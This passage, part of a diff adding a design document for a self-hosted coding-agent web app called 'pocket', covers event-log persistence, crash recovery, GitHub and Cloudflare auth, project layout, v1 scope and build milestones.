+      PendingApprovals.tsx   ← queue when reconnecting after disconnect
+      Composer.tsx
+      StatusBadge.tsx        ← thinking / working / idle / awaiting-permission
+```
+
+### Two important UI principles
+
+1. **Render from the event log, don't store derived state separately.** A `useReducer` over the event stream produces the message list. This is identical to how the server thinks — same mental model on both sides, fewer bugs.
+2. **Optimistic user messages.** When you submit, render the message immediately with a pending state. Replace it with the server's authoritative version when the corresponding `user_message` event arrives. Same pattern for permission resolutions.
+
+### SSR caveat
+
+TanStack Start does SSR. Your existing hydration concern (the `wsUrl` in `useEffect`) generalizes here: anything that depends on `EventSource` must be client-only, since `EventSource` doesn't exist on the server. Wrap session-stream-using components with a "client only" boundary or render a skeleton during SSR.
+
+---
+
+## 12. Persistence and crash recovery
+
+### What persists where
+
+| Data | Where | Format | When written |
+|---|---|---|---|
+| Session events | `~/.pocket/sessions/{id}/events.jsonl` | JSONL | append, sync after every event |
+| Session metadata | `~/.pocket/sessions/{id}/meta.json` | JSON | on status change, debounced |
+| Permissions | `~/.pocket/sessions/{id}/permissions.json` | JSON | on rule change |
+| Workspace | `~/.pocket/workspaces/{id}/` | git checkout | continuously by tools |
+| User config | `~/.pocket/config.json` | JSON | on settings change |
+
+### The append-and-fsync invariant
+
+`events.jsonl` writes are append-only and `fsync`-ed before the runner emits the corresponding in-memory event. This means: **if the event is observable to anyone, it's already on disk.** A crash mid-turn loses at most the in-flight tool execution, not its history.
+
+### Crash recovery
+
+On server start:
+1. Scan `~/.pocket/sessions/` for sessions with status `working` in `meta.json`
+2. For each: mark status `interrupted`, append a `status` event explaining the crash, but do NOT auto-resume the agent loop
+3. Client gets the `interrupted` status on its next SSE connect; UI shows a "Resume" button
+
+Auto-resume is intentionally not v1 — you want to see what the agent was doing before deciding to continue.
+
+### Cleanup
+
+Workspace cleanup is intentionally conservative because you might come back to a session days later from a different device:
+
+- **Never auto-cleaned**: workspaces for sessions with status `idle`, `working`, or `interrupted`
+- **Auto-cleaned after 30 days**: workspaces for sessions with status `done` or `archived`
+- **Always preserved**: session metadata and event log (small, no reason to delete)
+
+Manual cleanup is available via the UI: per-session "delete workspace" (preserves chat history) and "delete session entirely" buttons.
+
+The previous 7-day default was wrong for the "phone died, reopened a week later" case — it would have left the chat intact but stripped the repo, which is the worst possible state.
+
+---
+
+## 13. Auth and tunneling
+
+### GitHub auth (unchanged from your current design, just specified properly)
+
+- Server reads `GITHUB_TOKEN` from `.env` as default
+- User can override per-session in the new-session form
+- Token is **never** logged and never sent to the client after creation
+- Git operations inject the token into the HTTPS URL (your existing pattern)
+- `github_create_pr` uses Octokit with the same token
+
+### Web auth
+
+Handled by Cloudflare Access in front of the tunnel — the server itself has no auth code. Every request to the tunnel hits Cloudflare's identity check first; the server only sees authenticated requests. This is the right answer and means zero auth code in v1.
+
+If you ever want to know *who* made a request (e.g. for multi-user later), Cloudflare Access injects a `Cf-Access-Authenticated-User-Email` header you can read server-side.
+
+### Cloudflare tunnel config notes
+
+- Disable buffering on your tunnel route — SSE needs immediate flushing (`Cache-Control: no-store` on the SSE response, plus tunnel-side `--no-tls-verify` is unrelated, just don't cache)
+- The 100-second idle timeout is fine because of heartbeats
+- WebSocket-specific tunnel config is irrelevant — you're not using them
+
+---
+
+## 14. Project layout
+
+Single-process, single-port, served as one Node app. Monorepo stays Nx for consistency with your other work, but the apps are dirt simple:
+
+```
+pocket/
+├── apps/
+│   ├── web/               ← TanStack Start frontend
+│   └── server/            ← Node API + agent runtime
+├── packages/
+│   ├── core/              ← shared types: Event, Tool, Message, Session
+│   ├── agent/             ← AgentRunner, query loop, tool executor, permissions
+│   ├── tools/             ← all tool implementations (one file each)
+│   └── llm/               ← provider abstraction, OpenRouter client
+└── README.md
+```
+
+`apps/server/` is a thin shell: it sets up Fastify, mounts routes, instantiates `SessionManager` from `packages/agent`, and serves `apps/web/dist` for static files. All the meat is in `packages/`.
+
+---
+
+## 15. What's deliberately NOT in v1
+
+These have a designed-in seam but no implementation:
+
+- **Subagents** (`AgentRunner` is one class; v2 splits into Leader/Teammate)
+- **Compaction pipeline** (token cap + new-session-with-context covers v1)
+- **MCP servers** (the `Tool` interface is uniform enough that MCP tools can plug in identically — that's the seam)
+- **Hooks** (no pre/post-tool hook fires; if you need them, the executor has clear injection points)
+- **Voice / push notifications** (the event log makes both straightforward to add)
+- **Multi-user** (single-user assumption is baked into auth and storage; don't accidentally couple it deeper)
+
+---
+
+## 16. Build order — concrete v1 milestones
+
+Each milestone is independently shippable and testable.
+
+**M1 — Loop and persistence (~3 days)**
+- `core` types, event log writer, SessionManager, AgentRunner with the query loop
+- One tool: `read_file`. No permissions yet.
+- CLI smoke test: send a message via curl, see SSE events, see `events.jsonl` grow
+
+**M2 — Web client (~3 days)**
+- TanStack Start app, session list, chat view
+- SSE hook with reconnect/replay
+- Composer, message rendering from event log
+
+**M3 — Tools and permissions (~4 days)**
+- Implement the v1 foreground tool inventory (excluding background)
+- Permission gate, conditional rules, "ask" UX in the client
+- Bash matchers (allow/deny regex engine)
+- Pending-approvals queue when reconnecting
+
+**M4 — Git/GitHub integration (~2 days)**
+- Workspace cloning, branch/commit/push tools, PR creation
+- Protected-branch check for `git_push`
+- Manual commit/PR buttons in UI
+
+**M5 — Background processes (~3 days)**
+- ProcessManager, ring buffers, the four bash_background tools
+- Foreground bash timeout
+- PID persistence, startup sweep for stale PIDs
+- UI: process list panel showing what's running per session
+
+**M6 — Hardening (~2 days)**
+- Token cap + new-session-with-context
+- Crash recovery on server restart (sessions + processes)
+- End-to-end test on the tunnel
+
+About 2.5 weeks of focused work for v1. Everything beyond is iteration.
+
+---
+
+## 17. URL persistence (carried over from your old design)
+
+The `?sessionId=...` query param behavior from your existing app is preserved:
+
+- New session → URL updates to `/sessions/abc123` (TanStack Router file-based route)
+- Reload → SSE reconnects with `Last-Event-ID`, full chat replays
+- Two tabs on the same session URL → both render the same event log, both show the same state in real time
+- Sessions list page reads from `~/.pocket/sessions/` directory, so anything ever created appears there
+
+This is one of the things the event-log architecture makes free: deep linking, multi-tab, refresh-survives, "share a session URL with my other browser" all work without any special handling.
+
+---
+
+## 18. Open questions for you
+
+All major design questions are resolved. Remaining items are small choices you can defer until you hit them:
+
+1. **Bash allow rules** — extend the matchers in §6 as you find commands you run constantly (Nx variants, Rspack/Vite tasks, formatters with project-specific configs).
+2. **Process buffer size** — set to 4MB per stream per process for now. If memory pressure ever shows up (8 processes × 2 streams × 4MB = 64MB worst case, which is fine), tune down. If you find logs scrolling out of the buffer on long-running watchers, tune up.
+3. **Foreground bash timeout** — defaulted to 5 minutes. If you find the agent regularly hitting this on legitimate commands (slow test suites?), bump it.
